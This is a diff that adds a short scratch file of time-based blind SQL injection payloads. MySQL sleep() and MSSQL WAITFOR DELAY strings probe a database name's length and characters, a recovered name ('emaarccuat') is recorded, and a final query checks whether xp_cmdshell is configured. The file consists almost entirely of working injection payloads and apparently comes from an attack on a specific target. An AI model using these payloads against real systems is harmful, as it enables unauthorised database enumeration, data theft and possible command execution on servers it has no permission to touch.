@@ -1,0 +1,25 @@
+1' and (select sleep(5) from dual where length(database()) like '11') and '1'='1
+' and (select sleep(2) from dual where substring(database(), 1, 1) = 'a') and '1'='1
+
+
+
+db name
+
+emaarccuat
+1' and (select sleep(5) from dual where database()='emaarccuat') and '1'='1
+
+
+
+
+1' and (select WAITFOR DELAY '0:0:5' from dual where length(database()) like '11') and '1'='1
+
+
+')IF (1=1) WAITFOR DELAY '0:0:5'; --
+======================================================================================
+
+')IF LEN(DB_NAME()) = 11 WAITFOR DELAY '0:00:05'; --
+IF DB_NAME() = 'emaarccuat' WAITFOR DELAY '0:00:05';
+
+
+
+SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
